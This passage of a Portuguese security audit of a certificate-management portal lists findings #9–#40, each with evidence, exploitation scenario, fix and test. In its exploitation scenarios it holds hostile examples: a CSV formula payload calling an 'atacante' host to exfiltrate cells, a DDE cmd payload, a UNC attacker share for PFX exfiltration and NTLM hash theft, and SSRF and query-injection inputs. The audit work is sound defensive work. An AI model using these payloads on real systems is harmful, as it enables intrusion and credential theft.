**Evidência.** `app/main.py:1435` (`:1444-1449`), `:1535` (`:1551-1555`), `:1273` (`:1351`), `:1590`; `app/permissoes.py:134,153` (padrão `NIVEL_NENHUM`), `:298` (`PAPEIS_CONFIGURAVEIS = ("gestor", "user")`); `app/main.py:1481` (`PUT /api/permissoes`). `_garantir_que_sobra_admin` (`:1478`) protege contra ficar sem admin, nunca contra ganhar um.

**Como seria explorado.** Admin concede `usuarios: editar` a `gestor` acreditando ser um degrau intermediário. O gestor faz `PUT /api/users/{próprio_id}` com `role="admin"`, ou redefine a senha do admin e entra como ele.

**Impacto.** Escalada a administrador a partir de um nível apresentado como parcial.

**Correção sugerida.**

```python
def _exigir_alcance_de_papel(ator: auth.TokenData, papel_alvo: Optional[str]) -> None:
    """Só admin concede o papel de admin."""
    if (papel_alvo or "").strip().lower() != "admin":
        return
    if (ator.role or "").strip().lower() != "admin":
        raise HTTPException(403, "Só um administrador pode conceder o papel de administrador.")
# chamar em create_user, update_user e import_users; em reset_user_password,
# recusar quando o alvo é admin e o ator não é.
```

**Como testar.** Conceder `gestor → usuarios: editar`; como gestor, `POST /api/users` com `role="admin"` → 403; `PUT` no próprio id com `role="admin"` → 403; `reset-password` no id do admin → 403.

---

### #10 — Alta — Importação CSV cria contas sem `deve_trocar_senha`/`ativo` e aceita `admin`

**O que é.** O insert do CSV omite `deve_trocar_senha` e `ativo`; a coluna cai no `DEFAULT false`. Toda conta importada nasce com uma senha que consta em texto claro numa planilha e vale para sempre. É o único caminho de cadastro que escapa da obrigação de troca.

**Evidência.** `app/main.py:1374-1381`:

```python
sb.table("users").insert({"email": email, "password_hash": auth.get_password_hash(senha),
                          "full_name": nome, "role": role}).execute()
```

vs. `create_user` `app/main.py:1461-1472` (`"deve_trocar_senha": True, ... "ativo": True`); `db/001_users_base.sql:19` (`DEFAULT false`); `app/main.py:1351` (`role` da planilha validado só contra `PAPEIS_VALIDOS`).

**Como seria explorado.** Planilha circulada por e-mail contém as senhas iniciais de todos; nenhuma é forçada a mudar. Uma linha com `nivel=admin` cria um admin (ver #9).

**Impacto.** Senhas conhecidas por terceiros permanecem válidas; criação de admin por planilha.

**Correção sugerida.** Acrescentar `"deve_trocar_senha": True, "ativo": True` ao insert e aplicar `_exigir_alcance_de_papel` (#9) por linha.

**Como testar.** Importar CSV com `nivel=user`, logar com a senha da planilha, chamar `/api/users` → deve ser 403 com `X-Senha-Provisoria: 1` (hoje é 200).

---

### #11 — Alta — Importações: arquivo lido antes do teto, sem teto de linhas, bcrypt por linha, zip bomb

**O que é.** `await file.read()` bufferiza o corpo inteiro antes do `413`. Não há limite de `Content-Length` no middleware nem no gunicorn. Cada linha do CSV de usuários faz duas idas ao banco e um bcrypt custo 12 (~250 ms). `.xlsx` é aceito por `PK` e materializado inteiro com `list(ws.iter_rows(...))`.

**Evidência.** `app/main.py:1288-1294` e `:4907-4911` (teto após `read()`); `:1370-1381` (N+1 com `auth.get_password_hash`); `app/auth.py:75` (`rounds=12`); `:4848-4850` (`load_workbook` + `list(...)`); `:4916` (`PK`); `Procfile` (`--workers 1 --timeout 120`).

**Como seria explorado.** POST de 2 GB → disco e banda até o 413. CSV válido de 5 MB (~100.000 linhas) → horas de CPU num único worker, `--timeout 120` mata no meio e deixa importação parcial. `.xlsx` de 5 MB com dimensão gigante → GB de RAM.

**Impacto.** Indisponibilidade total (um worker); estado parcial no banco.

**Correção sugerida.**

```python
LIMITE_UPLOAD_BYTES = 5 * 1024 * 1024
MAX_LINHAS_IMPORT = 2000

def _ler_upload_limitado(request: Request, file: UploadFile) -> bytes:
    declarado = int(request.headers.get("content-length") or 0)
    if declarado > LIMITE_UPLOAD_BYTES + 4096:
        raise HTTPException(413, "Arquivo muito grande (limite de 5 MB).")
    partes, total = [], 0
    while chunk := file.file.read(64 * 1024):
        total += len(chunk)
        if total > LIMITE_UPLOAD_BYTES:
            raise HTTPException(413, "Arquivo muito grande (limite de 5 MB).")
        partes.append(chunk)
    return b"".join(partes)
# no laço: linhas = list(itertools.islice(reader, MAX_LINHAS_IMPORT + 1)); se > MAX → 413;
# e-mails existentes numa consulta só.
```

**Como testar.** CSV com 2.001 linhas → 413; `Content-Length: 50000000` → 413 antes do handler; CSV de 2.000 linhas termina em < 60 s.

---

### #12 — Alta — `/duplicidades` O(n²) com `SequenceMatcher`, sem cache nem teto, aberto a todo papel

**O que é.** Laço duplo sobre o snapshot inteiro com `SequenceMatcher.ratio()` por par; sem paginação, cache ou rate limit; `duplicidades: ler` é padrão de `gestor` e `user`; um worker.

**Evidência.** `app/main.py:3340-3365` (`for i in range(n): for j in range(i+1, n): ... SequenceMatcher(...).ratio() >= 0.86`), `:3704` (rota); `app/permissoes.py:121,142`; `Procfile`.

**Como seria explorado.** Operador comum em laço de `curl`. Com n = 1.000 são 500.000 comparações por requisição; o worker é morto pelo `--timeout 120` e reinicia.

**Impacto.** Indisponibilidade do portal por um usuário comum.

**Correção sugerida.** Teto por identidade (`taxa.permitir(f"dup:{token.email}", 5, 300)`), teto de itens (`> 1500 → 413`), memoização por `scanned_at`, e blocking key (primeiros 4 caracteres do nome normalizado) antes do `SequenceMatcher`.

**Como testar.** Snapshot sintético de 3.000 itens: `assert tempo < 2.0`; duas chamadas seguidas geram um cálculo só.

---

### #13 — Alta — `esc()` não escapa aspas e é usado dentro de atributos HTML

**O que é.** `esc()` faz `textContent` → `innerHTML`, o que escapa `<`, `>` e `&` mas **não** `"` nem `'`. Os templates usam `esc(...)` para montar atributos (`title="${esc(x)}"`, `data-*="..."`). Um valor com `"` fecha o atributo e abre outro (`onmouseover=`, etc.). O CSP com nonce bloqueia handlers inline, o que reduz o impacto a injeção de atributos/CSS e quebra de marcação, mas a função é apresentada como escape geral.

**Evidência.** `static/ui-common.js:482-486`:

```js
function esc(v) {
  const d = document.createElement("div");
  d.textContent = v == null ? "" : String(v);
  return d.innerHTML;
}
```

Usos em atributo: `templates/index.html:598,872` e cerca de 28 outros pontos nos templates.

**Como seria explorado.** Um item de inventário (nome do titular vindo do PFX, ou `file_name`) contendo `" style="..."` altera o atributo. Dados chegam via `/api/ingest` de qualquer agente (#4).

**Impacto.** Injeção de atributos e CSS; com a CSP atual, sem execução de script. Se a CSP for relaxada (#49), vira XSS armazenado com token em `localStorage` (#23).

**Correção sugerida.**

```js
const _ESC = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
function esc(v) { return String(v == null ? "" : v).replace(/[&<>"']/g, (c) => _ESC[c]); }
```

**Como testar.** `esc('a"b')` deve devolver `a&quot;b`; teste de template que injeta um titular com `"` e confere que o `title` do elemento renderizado contém a aspa literal e o DOM não ganhou atributos extras.

---

### #14 — Alta — Injeção de fórmula em CSV exportado no cliente

**O que é.** As exportações CSV das telas Início, Histórico e Vencidos escapam apenas aspas duplas. Uma célula que comece com `=`, `+`, `-`, `@` é interpretada como fórmula pelo Excel/LibreOffice.

**Evidência.** `templates/index.html:969-973`:

```js
.map((r) => r.map((c) => `"${String(c ?? "").replace(/"/g, '""')}"`).join(";"))
```

`templates/historico.html:337-340`, `templates/vencidos.html:457-460` (mesmo padrão).

**Como seria explorado.** Um PFX com titular `=HYPERLINK("http://atacante/"&A1;"abrir")` ou `=cmd|'/c ...'!A0` entra pelo inventário; o operador exporta e abre no Excel.

**Impacto.** Execução de DDE/ligações externas na máquina do operador; exfiltração de células.

**Correção sugerida.**

```js
function celulaCsv(c) {
  let s = String(c ?? "");
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;   // neutraliza fórmula
  return `"${s.replace(/"/g, '""')}"`;
}
```

**Como testar.** Exportar um item cujo titular comece com `=` e conferir que a célula gerada começa com `"'=`.

---

### #15 — Alta — SMTP sem verificação de certificado; opção "Nenhuma" manda credencial em claro

**O que é.** `SMTP_SSL(...)` e `starttls()` são chamados sem `context=`; a `smtplib` usa um contexto padrão que **não** verifica o certificado do servidor. `validate_smtp_config` só proíbe TLS e SSL juntos; permite os dois desligados, e a UI oferece "Nenhuma".

**Evidência.** `app/smtp_service.py:124-131`:

```python
if use_ssl:
    server = smtplib.SMTP_SSL(host, port, timeout=10)
else:
    server = smtplib.SMTP(host, port, timeout=10)
with server:
    if not use_ssl and use_tls:
        server.starttls()
```

`app/smtp_service.py:92-95` (`validate_smtp_config`); `app/main.py:2109-2111` (mapeamento de "Nenhuma").

**Como seria explorado.** MITM na rede entre o servidor e o SMTP apresenta certificado qualquer e captura usuário e senha SMTP; com "Nenhuma", nem precisa de MITM ativo.

**Impacto.** Comprometimento da conta de e-mail corporativa que envia alertas e códigos de recuperação de senha (#8).

**Correção sugerida.**

```python
import ssl
ctx = ssl.create_default_context()        # verifica cadeia e hostname
if use_ssl:
    server = smtplib.SMTP_SSL(host, port, timeout=10, context=ctx)
else:
    server = smtplib.SMTP(host, port, timeout=10)
with server:
    if not use_ssl:
        if not use_tls:
            raise ValueError("Conexão SMTP sem TLS não é permitida.")
        server.starttls(context=ctx)
```

E remover "Nenhuma" do `select` da tela, ou aceitá-la só para `localhost`.

**Como testar.** Servidor SMTP de teste com certificado autoassinado → envio deve falhar com `SSLCertVerificationError`; `PUT /api/settings` com `smtp_seguranca="nenhuma"` e host externo → 422.

---

### #16 — Alta — Pastas de origem/vencidos arbitrárias: leitura e movimentação de PFX, UNC, DoS por `rglob`

**O que é.** `source_folder`/`expired_folder` chegam de `PUT /api/settings` com `.strip()` como única validação e viram `Path(p)` sem `resolve()`, sem raiz permitida, sem recusa de UNC. Quem lê a pasta é qualquer autenticado (`/api/certificados?fonte=local`); quem move é admin (`/api/mover-vencidos`).

**Evidência.** `app/main.py:2181-2182`; `app/settings_state.py:57-67` (`return Path(p)`); `app/cert_scanner.py:147-167` (`rglob("*")` recursivo sem teto); `app/main.py:3043`, `:4218-4243` (`scan_folder(src)` + `move_to_expired(c, exp)`), `:908,943,4228,4236`; `app/cert_scanner.py:226`.

**Como seria explorado.** (1) `source_folder=C:\dados\certificados_prod`, `expired_folder=\\atacante\share` + `/api/mover-vencidos` → exfiltração assistida ou destruição do acervo. (2) No Windows, `Path.is_dir()` sobre UNC dispara autenticação SMB automática → hash NTLMv2 da conta de serviço vaza para host do atacante. (3) `source_folder=C:\` → `rglob` trava o processo.

**Impacto.** Exfiltração de PFX, roubo de hash NTLM, indisponibilidade.

**Correção sugerida.**

```python
# app/settings_state.py
RAIZES_PERMITIDAS = [Path(p).resolve() for p in
    (os.getenv("PASTAS_PERMITIDAS") or "").split(os.pathsep) if p.strip()] \
    or [config.CERT_SOURCE_DIR, config.CERT_EXPIRED_DIR]

def validar_pasta(bruto: str, rotulo: str) -> str:
    p = (bruto or "").strip()
    if not p:
        return ""
    if p.startswith(("\\\\", "//")):
        raise CaminhoRecusado(f"{rotulo}: caminho de rede (UNC) não é aceito.")
    alvo = Path(p).resolve()
    if not any(alvo == r or r in alvo.parents for r in RAIZES_PERMITIDAS):
        raise CaminhoRecusado(f"{rotulo}: precisa estar sob uma das pastas permitidas.")
    return str(alvo)
# put_settings: validar antes de montar PortalSettings (422 em CaminhoRecusado);
# aplicar também em effective_source()/effective_expired() (valores antigos no banco);
# teto de arquivos e profundidade em scan_folder.
```

**Como testar.** `PUT /api/settings` com `\\atacante\share`, `C:\Windows`, `/etc`, `../../` → 422 e `load_settings().source_folder` inalterado.

---

### #17 — Alta — Segredos locais de baixa entropia no `.env`

**O que é.** O `.env` local (não rastreado, confirmado com `git ls-files --error-unmatch .env`) contém valores fracos ou obsoletos. Não é verificável pelo código se produção usa os mesmos valores.

**Evidência (mascarada).**

| Variável | Arquivo | Observação |
|---|---|---|
| `API_KEY` | `.env` | 11 caracteres, `ana••••2020` — palavra + ano |
| `JWT_SECRET_KEY` | `.env` | 38 caracteres, frase legível `cer••••erio` |
| `SUPABASE_SERVICE_KEY` | `.env` | `sb_••••yUq` — serviço já desativado, chave ainda no arquivo |
| `CERT_ENCRYPTION_KEY*`, `ENCRYPTION_KEY` | `.env` | todas as chaves do cofre ao lado de `data/portal_settings.json` (cifrado) |

**Como seria explorado.** `API_KEY` fraca é adivinhável por dicionário e dá papel `agent` (rotas de fila, upload, ingest). `JWT_SECRET_KEY` em frase permite forjar JWT offline com `hashcat` sobre um token capturado.

**Impacto.** Forja de sessão; identidade de agente.

**Correção sugerida.** Gerar com `python -c "import secrets; print(secrets.token_urlsafe(48))"` para `API_KEY` e `JWT_SECRET_KEY`; remover `SUPABASE_SERVICE_KEY`; guardar as chaves do cofre fora do `.env` (variáveis do serviço Windows ou gestor de segredos) e manter cópia offline (já pendente). Em `verificar_ambiente()`, tornar fatal `len(JWT_SECRET_KEY) < 32` ou `API_KEY` com menos de 24 caracteres.

**Como testar.** Boot com `JWT_SECRET_KEY=curta` deve falhar em `verificar_ambiente`.

---

### #18 — Alta — Chave do agente em claro em `agent_config.json` na pasta do programa

**O que é.** A tela de Configuração instrui a gravar `agent_config.json` com a `X-API-Key` em texto claro em `{app}` (pasta do programa, legível por qualquer usuário local). O agente lê e usa.

**Evidência.** `templates/configuracao.html:588-605`; `agent_setup.iss:31`; `agent/run_agent.py:240-291,639-642`.

**Como seria explorado.** Qualquer usuário local da estação lê o arquivo e ganha papel `agent` no portal (ver #3, #4).

**Impacto.** Credencial de máquina exposta a todo usuário da estação.

**Correção sugerida.** Guardar o segredo com DPAPI (`win32crypt.CryptProtectData`, escopo `LOCAL_MACHINE`) num arquivo em `{commonappdata}` com ACL restrita ao SYSTEM/serviço, ou no Credential Manager; a chave compartilhada (`API_KEY`) deve sair do instalador quando as estações migrarem para credencial de máquina.

**Como testar.** Após a instalação, `icacls` do arquivo de credencial não deve listar `Users`; o conteúdo não deve ser texto legível.

---

### #19 — Alta — Senha do PFX cifrada sem `key_version`

**O que é.** O ciphertext do PFX carrega `key_version` e a decifra escolhe a chave pela versão gravada no banco. O ciphertext da **senha** não carrega versão: é sempre decifrado com a chave corrente. Rotacionar `CERT_PASSWORD_KEY` deixa todas as senhas do cofre indecifráveis.

**Evidência.** `app/cert_installer.py:107-114` (cifra da senha, sem versão) vs `:137-150` (cifra do PFX com versão); `revalidar_cofre` `app/main.py:1107-1152` só lê, não recifra.

**Como seria explorado.** Não é ataque; é perda operacional. Uma rotação de emergência (após vazamento) quebra o cofre inteiro.

**Impacto.** Impossibilidade prática de rotacionar a chave de senha; cofre reconstruível só a partir dos PFX originais.

**Correção sugerida.** Mesmo envelope do PFX (`versao || nonce || ciphertext`), com `CURRENT_KEY_VERSION` gravada, e rota `recifrar-cofre` que reprocessa linhas com versão antiga.

**Como testar.** Cifrar com v1, subir com v2 configurada e v1 disponível como `_V1`, decifrar → deve funcionar.

---

### #20 — Alta — `.gitignore` sem `*.p12`, `*.pem`, `*.key`, `agent_config.json`, `certificados/`

**O que é.** O `.gitignore` tem `*.pfx` (`.gitignore:15`) e não tem `*.p12` — a extensão do arquivo do achado #1, removida justamente no commit que o adicionou. Também faltam `*.pem`, `*.key`, `*.cer`, `*.crt`, `*.bak`, `*.old`, `*.orig`, `agent_config.json`, `certificados/`, `certificados_vencidos/`.

**Evidência.** `.gitignore:15-16` (`*.pfx`, `data/`); `grep -n p12 .gitignore` → vazio; `git show --stat 3175a05` mostra `.gitignore | 1 -`.

**Como seria explorado.** `git add .` com um `.p12` na pasta de trabalho repete o #1.

**Impacto.** Recorrência do vazamento.

**Correção sugerida.** Acrescentar ao `.gitignore`:

```
*.p12
*.pem
*.key
*.cer
*.crt
*.bak
*.old
*.orig
*.swp
agent_config.json
certificados/
certificados_vencidos/
```

E um hook `pre-commit` que recuse os mesmos padrões.

**Como testar.** `git check-ignore -v certificados/x.p12` deve apontar a regra.

---

### #21 — Média — `/claim` não confere `target_machine` nem quem apresenta o token

**O que é.** O resgate é só pelo token. `target_machine` está gravado na linha do `install_token` mas não é conferido. O token viaja portal → INVENT → fila → agente; qualquer ponto que o leia resgata as chaves.

**Evidência.** `app/main.py:5723-5776`; `app/cert_installer.py:1468` (`target_machine` gravado), `:1517-1524` (consumo atômico, correto).

**Como seria explorado.** Ver #3. Também: leitura da fila do INVENT (outro sistema) ou do corpo da chamada `_pedir_instalacao_ao_invent` (`app/main.py:5612-5622`).

**Impacto.** Amplia quem pode resgatar chaves privadas.

**Correção sugerida.** Exigir credencial de máquina em `/claim` e comparar `token_data["target_machine"]` com `token.machine_id`; resposta idêntica ("Token inválido, expirado ou já utilizado") em divergência.

**Como testar.** Token emitido para `MAQ-B`, resgatado com credencial de `MAQ-A` → 403 e token não consumido... ou consumido e logado como `ERRO`, conforme a política escolhida.

---

### #22 — Média — Desativar/excluir usuário não revoga tokens de instalação pendentes

**O que é.** `deactivate_user` e `delete_user` não tocam em `install_token`. Como `/claim` não autentica, tokens emitidos pela conta continuam resgatáveis até expirar (TTL padrão 5 min, configurável até 1.440 min).

**Evidência.** `app/main.py:1611-1654`, `:1706-1713`; comentário em `:1637-1638` afirma que `require_auth` cobre — verdadeiro para o portal, falso para `/claim`; `app/cert_installer.py:1159-1186` (TTL até 24 h).

**Correção sugerida.**

```python
def _revogar_tokens_de_instalacao(sb, user_id: str) -> int:
    agora = datetime.now(timezone.utc).isoformat()
    r = (sb.table("install_token").update({"consumed_at": agora})
           .eq("user_id", user_id).is_("consumed_at", "null").execute())
    return len(r.data or [])
# chamar em deactivate_user, delete_user e update_user quando ativo → False
```

**Como testar.** Emitir token via `/prepare`, desativar o usuário, `/claim` com o token → 403 (hoje devolve o bundle).

---

### #23 — Média — JWT de 24 h sem `jti`/revogação individual, em `localStorage`, logout só no cliente

**O que é.** Não há rota de logout; "Sair" só limpa o `localStorage`. Um token copiado vale até `exp` (24 h). Não há `jti` nem versão de sessão; só troca de senha e desativação derrubam. Contraste com o token do agente (60 min).

**Evidência.** `app/auth.py:10-11` (`ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24`); `static/ui-common.js:12,27-29,41-47`; `app/main.py:164-190` (`_senha_trocada_depois_do_token`), `:1192` (login não invalida anteriores). Verificado OK: `algorithms=[ALGORITHM]` fixo, `iss`/`aud` validados, segredo só do ambiente, CSP com nonce.

**Correção sugerida.** Coluna `sessao_versao` em `users`, claim `sv` no JWT, conferência em `_sessao_do_token`, rota `POST /api/logout` que incrementa a versão; reduzir a validade para 8 h.

**Como testar.** Guardar o JWT, chamar `/api/logout`, reusar em `/api/certificados` → 401 (hoje 200).

---

### #24 — Média — `reset_user_password` não carimba `senha_alterada_em`

**O que é.** Os outros dois caminhos de troca de senha gravam `senha_alterada_em`, que é o que invalida JWTs anteriores. O reset por admin não grava; a proteção fica pendurada só em `deve_trocar_senha`.

**Evidência.** `app/main.py:1600-1606` vs `:2431-2441` e `:2517-2522`.

**Correção sugerida.** Acrescentar `"senha_alterada_em": datetime.now(timezone.utc).isoformat()` ao update.

**Como testar.** Logar como `user`, admin faz reset, JWT antigo em `/api/senha/trocar` → 401 (hoje 400 "senha atual não confere", ou seja, a sessão existe).

---

### #25 — Média — Política de senha: mínimo de 6, sem outras regras, `6` duplicado; sem teto de 72 bytes

**O que é.** `SENHA_MINIMA = 6` em quatro pontos e o literal `6` num quinto. Nenhuma lista de senhas comuns. O bcrypt trunca em 72 bytes e não há máximo, então senhas longas são silenciosamente truncadas.

**Evidência.** `app/main.py:1398`, `:1452`, `:1360`, `:2415`, `:2486`, `:1597` (`if len(new_pw) < 6`); `app/auth.py:71-77`.

**Correção sugerida.** `SENHA_MINIMA = 12`, função única `_validar_senha` (comprimento, lista proibida, não igual ao e-mail, `len(senha.encode()) <= 72`), substituindo as cinco checagens.

**Como testar.** `POST /api/users` com `password="123456"` → 422; `reset-password` com o mesmo → 422; senha de 80 bytes → 422.

---

### #26 — Média — Oráculo de timing no login: bcrypt pulado quando a conta não existe

**O que é.** `if not user or not auth.verify_password(...)` curto-circuita: e-mail inexistente responde sem bcrypt (~0 ms), existente paga custo 12 (~200-300 ms). A mensagem idêntica não esconde a diferença. Mesmo padrão em `/api/senha/codigo` (#8).

**Evidência.** `app/main.py:1138`.

**Correção sugerida.**

```python
_HASH_FALSO = auth.get_password_hash(secrets.token_urlsafe(32))  # no import
hash_alvo = user["password_hash"] if user else _HASH_FALSO
senha_ok = auth.verify_password(senha, hash_alvo)
if not user or not senha_ok: ...
```

**Como testar.** 30 chamadas com e-mail inexistente e 30 com existente (senha errada): `abs(mediana_a - mediana_b) < 25 ms`.

---

### #27 — Média — Login responde 403 "Usuário desativado"

**O que é.** Após a senha conferir, conta inativa devolve 403 com mensagem própria; senha errada devolve 401. Confirma a quem tem credencial vazada que a conta existe e foi desativada.

**Evidência.** `app/main.py:1150` (401) vs `:1160` (403).

**Correção sugerida.** Mesmo 401 genérico; registrar o motivo apenas em `atividade`.

**Como testar.** Login com senha correta em conta `ativo=false` → 401 com o mesmo corpo do caso "senha errada".

---

### #28 — Média — `/smtp/test`, `/alerts/trigger` e `/ingest`→alertas sem teto; destinatário não validado

**O que é.** `/smtp/test` envia um e-mail por chamada a `target_email` sem `_validar_email` nem teto; o endereço vai direto para `msg["To"]` e `sendmail`. `/alerts/trigger` roda `trigger_all_alerts()` síncrono sem debounce. `/api/ingest` agenda `trigger_all_alerts` a cada ingestão.

**Evidência.** `app/main.py:2546-2569`, `:2608-2614`, `:4207`; `app/smtp_service.py:120,136`; `app/alert_state.py:197` (guarda de intervalo usado só pelo laço de fundo).

**Correção sugerida.** `_validar_email(body.target_email)` (422 e corte de CR/LF); `taxa.permitir(f"smtp-test:{token.email}", 5, 3600)`; `taxa.permitir(f"alerts-trigger:{token.email}", 3, 3600)`; debounce em `/ingest` por `job_ja_executado_recentemente`.

**Como testar.** 6 POSTs a `/smtp/test` → o 6º é 429; `target_email="a@b.c\nBcc: x@y"` → 422.

---

### #29 — Média — Modelos Pydantic sem limites; `/api/certificados` sem paginação por padrão

**O que é.** `IngestBody.items: List[dict]` sem `max_length`; `smtp_port`, `LoginBody`, `UploadPfxRequest.fingerprint`, `ReportRequest` sem tetos; nenhum limite global de corpo. `/api/certificados` sem `pagina`/`por_pagina` devolve a lista inteira.

**Evidência.** `app/main.py:995-1000`, `:954-963`, `:1101`, `:1241`, `:4312`, `:5803`, `:3083-3084`; `:1213-1238` (`/api/users` faz `select` da `carteira` inteira por chamada); `:1417`, `:1503` (`select` de `users` inteira por operação).

**Correção sugerida.** `items: List[dict] = Field(default_factory=list, max_length=20000)`; `Field(max_length=...)` nos campos de texto; `smtp_port: int = Field(ge=1, le=65535)`; paginação padrão `por_pagina=100` em `/api/certificados`.

**Como testar.** `POST /api/ingest` com 20.001 itens → 422; `GET /api/certificados` sem parâmetros → `len(itens) <= 100`.

---

### #30 — Média — `/instalabilidade` e `/vault-optin` com `machine_id` livre: enumeração cruzada de estações

**O que é.** `/instalabilidade` é `require_auth` puro e devolve o inventário inteiro da máquina pedida como `{fingerprint: {id, estado}}`, incluindo os `fora_da_carteira`. O filtro de carteira decide o rótulo, não o conjunto.

**Evidência.** `app/main.py:5294-5323`, `:4406-4429`; `app/cert_installer.py:780-853`.

**Correção sugerida.** Omitir itens `fora_da_carteira` para quem não tem alcance total; validar que o `machine_id` é estação vinculada ao requisitante (`/minha-estacao` já sabe).

**Como testar.** Operador sem carteira chama `/instalabilidade?machine_id=QUALQUER` → `itens == {}`.

---

### #31 — Média — Trilha e logs expõem e-mail e IP de outros operadores; `user_email` é filtro livre

**O que é.** `/logs` faz `select("*")` do `install_log` (inclui `client_ip`, `user_email`) e não tem consumidor na UI; `/trilha` aceita `?user_email=` de qualquer pessoa. Ambas exigem só `instalador: ler`, que hoje é admin-only por padrão mas concedível pela tela.

**Evidência.** `app/main.py:5916-5923`, `:5926-5931`; `app/cert_installer.py:1672`, `:1688`; `app/permissoes.py:115-155`.

**Correção sugerida.** Escopar por `token.email` salvo para admin; remover `client_ip` para não-admin; lista explícita de colunas ou remoção da rota `/logs`.

**Como testar.** Gestor com `instalador: ler` chamando `?user_email=admin@x` recebe só as próprias cadeias, sem `client_ip`.

---

### #32 — Média — `/available` lista o cofre inteiro sem filtro de carteira

**Evidência.** `app/main.py:5889-5913` → `cert_installer.list_available_pfx(machine_id=None)` (`app/cert_installer.py:312`): titular, documento, subject, datas e `id` de todo o `cert_pfx_store`. Guarda `instalador: ler`, concedível.

**Correção sugerida.** Filtrar por `listar_carteira(user_id)` quando o papel não tem alcance total.

**Como testar.** Operador com carteira de um documento chama `/available` → só itens desse documento.

---

### #33 — Média — SSRF por host/porta SMTP: conexão TCP arbitrária a partir do servidor, com erro devolvido

**O que é.** `smtp_host`/`smtp_port` sem resolução, sem bloqueio de faixa privada, sem allowlist. `PUT /api/settings` + `POST /smtp/test` é um primitivo de conexão TCP sob demanda, e `detail=str(e)` transforma em scanner de portas semi-cego ("refused" ≠ "timed out" ≠ erro de protocolo).

**Evidência.** `app/main.py:2183-2184`, `:2546-2566`; `app/smtp_service.py:118-124`. Mitigante: exige `configuracao: editar`.

**Correção sugerida.** `_exigir_destino_publico(host, port)`: porta ∈ {25, 465, 587, 2525}, allowlist opcional `SMTP_HOSTS_PERMITIDOS`, `getaddrinfo` e recusa de `is_private/is_loopback/is_link_local/is_reserved/is_multicast`; mensagens fixas na rota, detalhe só no log.

**Como testar.** `smtp_host` ∈ {`127.0.0.1`, `169.254.169.254`, `10.0.0.5`, `localhost`} → `/smtp/test` responde 400 "interno".

---

### #34 — Média — Injeção na DSL `or_` via vírgula em `?busca=`; erro de SQL devolvido

**O que é.** `_escape_ilike_pattern` neutraliza `%` e `_`, mas a string entra numa expressão `or_("nome.ilike.X,file_name.ilike.X,...")` onde a **vírgula** separa cláusulas e o ponto separa campo/operador. Uma busca com vírgula acrescenta cláusulas arbitrárias da DSL (não SQL cru: o parser de `db_pg` continua usando identificadores e parâmetros, mas o atacante escolhe campo e operador, incluindo colunas não expostas). O erro do parser volta ao cliente.

**Evidência.** `app/main.py:3161`, `:3920-3925` (`filt = f"nome.ilike.{pat},file_name.ilike.{pat},..."`), `:3972`; `app/db_pg.py:280-301,467`.

**Correção sugerida.** Escapar vírgula e ponto no valor (ou recusar `busca` que os contenha), ou trocar a DSL por chamadas `.ilike()` encadeadas com `or` explícito no `db_pg`.

**Como testar.** `?busca=x,machine_id.eq.outra` deve devolver 422 ou resultado idêntico ao de `busca=x` literal.

---

### #35 — Média — Erros internos, de banco e de SMTP devolvidos crus ao cliente

**O que é.** `detail=str(e)` em 37 pontos (`grep -c 'detail=str(e)' app/main.py`); importação CSV devolve o erro do banco por linha; 500 com "Veja o terminal do uvicorn"; teste SMTP devolve a exceção (a máscara em `smtp_service.py:138-146` é por substring, frágil); `:5462` relê 200 bytes da resposta do INVENT.

**Evidência.** `app/main.py:1383-1384`, `:3153-3158`, `:2567-2568`, `:5462`, e as ocorrências em `:1202,1475,1586,1608,1628,1703,1816,1833,1855,1905,1963,1978,1989,2212,2445,2526,2568,2614,2655,2676,2698,2769,2941,2968,3157,3800,3973,4392,4464,4506,4547,4779,4824,5026,5288,5448,5676,5763`.

**Correção sugerida.** Handler global que registra `exc_info` com um `id` e devolve `{"detail": "Erro interno", "ref": id}`; nas rotas, mensagens fixas por classe de erro.

**Como testar.** Forçar `psycopg.OperationalError` num mock → resposta não contém nome de tabela, DSN nem traceback.

---

### #36 — Média — Sem `TrustedHostMiddleware`

**Evidência.** `app/main.py:612-682`: único middleware é `security_headers_middleware` (`:623`). O link de redefinição usa `PORTAL_BASE_URL` (`:2288-2292`), então o vetor clássico de host poisoning em e-mail está fechado; resta cache poisoning e redirecionamentos futuros.

**Correção sugerida.** `app.add_middleware(TrustedHostMiddleware, allowed_hosts=config.HOSTS_PERMITIDOS)` com a lista vinda do ambiente.

**Como testar.** Requisição com `Host: evil.example` → 400.

---

### #37 — Média — HSTS emitido, mas nenhum redirecionamento HTTP→HTTPS nem proxy no repositório

**O que é.** O middleware envia `Strict-Transport-Security` com `preload`, mas o repositório não traz nem `HTTPSRedirectMiddleware` nem configuração de proxy. A terminação TLS não é verificável pelo código (ver seção 5).

**Evidência.** `app/main.py:632`; `Procfile` (gunicorn puro); ausência de `Caddyfile`/`nginx.conf` versionados.

**Correção sugerida.** Versionar a configuração do proxy que faz a terminação (redirect 308 e cabeçalhos) ou, se o app fica exposto direto, `HTTPSRedirectMiddleware` condicionada a `producao`.

**Como testar.** `curl -I http://<host>/` → 301/308 para `https://`.

---

### #38 — Média — Documentação e script orientam HTTP em `0.0.0.0`

**Evidência.** `docs/GUIA_MIGRACAO_WINDOWS_SERVER.md:161,174`; `scripts/setup_porta_servidor.ps1:8,37,147` (abre porta e serve HTTP em todas as interfaces).

**Correção sugerida.** Documentar o bind em `127.0.0.1` atrás do proxy TLS; o script deve abrir só a porta do proxy.

**Como testar.** Revisão de doc; `netstat -an | findstr 8020` no servidor deve mostrar `127.0.0.1:8020`.

---

### #39 — Média — Agente segue redirect para outro host mantendo `X-API-Key`; `base_url` não exige https

**O que é.** `follow_redirects=True` foi ligado para o 308 http→https. `httpx` remove `Authorization` ao mudar de origem, mas não cabeçalhos personalizados como `X-API-Key`. Um 302 do portal (ou MITM se `base` for `http://`) entrega a credencial da estação a outro host.

**Evidência.** `agent/run_agent.py:52`, `:339-363`.

**Correção sugerida.** Hook de request que remove `X-API-Key` quando `request.url.host != urlparse(base).hostname`; recusar `base` que não seja `https://` salvo `localhost`.

**Como testar.** Servidor de teste responde 302 para outro host; o segundo host não deve receber `X-API-Key`.

---

### #40 — Média — Ponte INVENT não exige https; `CERT_PORTAL_TOKEN` e token bruto viajam nela

**Evidência.** `app/main.py:5369-5373`, `:5608-5619` (`httpx` com Bearer e `token_raw` no corpo); `app/config.py:129` (`INVENT_API_URL` só do ambiente, sem exigir esquema). Não é SSRF por entrada.

